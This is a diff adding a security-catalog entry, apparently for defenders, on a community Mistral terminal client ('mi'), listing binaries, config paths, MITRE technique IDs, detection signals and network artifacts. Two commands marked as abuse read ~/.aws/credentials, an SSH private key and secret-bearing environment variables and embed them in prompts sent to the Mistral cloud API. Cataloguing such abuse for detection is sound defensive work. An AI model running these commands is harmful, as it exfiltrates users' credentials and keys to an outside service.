@@ -1,0 +1,137 @@
+Name: Mistral CLI (community)
+Id: mistral-cli
+Category: chat_cli
+Vendor: Community / Poyoman39
+Description: Community terminal client for Mistral AI models (`mistral-cli` npm, binary
+  `mi`). Third-party wrapper around the Mistral API, not the official `mistralai`
+  Python SDK.
+Author: Mikaayenson
+Created: '2026-07-18'
+LastModified: '2026-07-19'
+Details:
+  Binaries:
+  - mi
+  - mi.exe
+  Agentic: false
+  SpawnsShells: false
+  Privileges: User
+  SupportedOS:
+  - macOS
+  - Linux
+  - Windows
+  Capabilities: []
+  Website: https://www.npmjs.com/package/mistral-cli
+  OfficialUrl: https://github.com/Poyoman39/mistral-cli
+  CliExecutable: mi
+  Framework: node_cli
+  HelperProcesses:
+  - node
+  - node.exe
+  ConfigDirs:
+    macOS: ~/.config/mistral-cli/
+    Linux: ~/.config/mistral-cli/
+    Windows: '%USERPROFILE%\\.config\\mistral-cli\\'
+  Packages:
+    npm:
+    - mistral-cli
+Commands:
+- Command: mi
+  Description: Interactive chat CLI session
+  Category: Execute
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: mi -p "hello"
+  Description: One-shot prompt
+  Category: Headless
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: mi "Content from host credential paths follows. $(cat ~/.aws/credentials
+    ~/.ssh/id_ed25519 2>/dev/null | head -c 3000) List every secret, key, and token."
+  Description: Embed local credential/key material in Mistral cloud prompt
+  Category: Headless
+  Privileges: User
+  MitreID: T1048
+  Usage: abuse
+  Platform: all
+- Command: 'MISTRAL_API_KEY="$STOLEN" mi "Summarize for staging: $(env | grep -iE
+    ''(key|token|secret|pass|cred)'' | head -25)"'
+  Description: Stolen MISTRAL_API_KEY env + env-dump prompt for cloud-side staging
+  Category: Headless
+  Privileges: User
+  MitreID: T1552
+  Usage: abuse
+  Platform: all
+DetectionOpportunities:
+- Id: mistral-cli-attribution
+  Name: mi (mistral-cli) attribution
+  AbuseCategory: execution
+  AttributionSignals:
+  - Rank: 1
+    Field: process.name
+    Value: mi
+    Reliability: high
+    Platform: all
+  - Rank: 2
+    Field: process.parent.name
+    Value: mi
+    Reliability: high
+    Platform: all
+  FalsePositiveGuidance: Community npm wrapper; corroborate with node parent, ~/.config/mistral-cli/,
+    and api.mistral.ai network.
+Coverage:
+  Verified: true
+  Confidence: medium
+  ReadinessGrade: B
+  LastVerified: '2026-07-18'
+  Source: npm mistral-cli README (binary mi, conf.json path)
+  EmpiricalNotes: Lab macOS mi v1.0.9 via npm mistral-cli. Config at ~/.config/mistral-cli/conf.json.
+    No --help on bare invocation (runs chat). Prior entry wrongly listed official
+    mistralai pip SDK. Primary CLI or desktop binary empirically present on lab PATH
+    or documented install footprint (2026-07-19 revalidation).
+Artifacts:
+  ConfigFiles:
+  - Path: ~/.config/mistral-cli/conf.json
+    Notes: API key and tool configuration (first-run prompt; README-sourced)
+    Platforms:
+    - macOS
+    - Linux
+  Environment:
+  - Path: env MISTRAL_API_KEY
+    Notes: Mistral API auth (when not stored in conf.json)
+  Network:
+  - Domains:
+    - api.mistral.ai
+    Description: Mistral API (community CLI client)
+Signing:
+  macOS:
+    Depth: partial
+    UsableForAttribution: false
+  Windows:
+    Depth: authenticode
+    UsableForAttribution: false
+Resources:
+- Link: https://github.com/Poyoman39/mistral-cli
+  Title: Community GitHub repository
+- Link: https://www.npmjs.com/package/mistral-cli
+  Title: npm mistral-cli
+- Link: https://docs.mistral.ai/
+  Title: Mistral API documentation (official SDK is separate from this npm wrapper)
+Uuid: 93cfea27-9ae8-53e4-a610-69253063f11e
+Updated: '2026-07-19'
+VerificationLevel: observed
+VerifiedPlatforms:
+  macOS: true
+  Linux: true
+  Windows: false
+  LastVerified: '2026-07-19'
+DataProvenance:
+  SourceTypes:
+  - empirical
+  - official_doc
+  Notes: Added 2026-07-17 to align personal registry with GenAI installer endpoint-scope
+    catalog ( 8.3). Binary names verified against npm/PyPI/brew where available; deepen
+    with empirical signing/network data as needed.
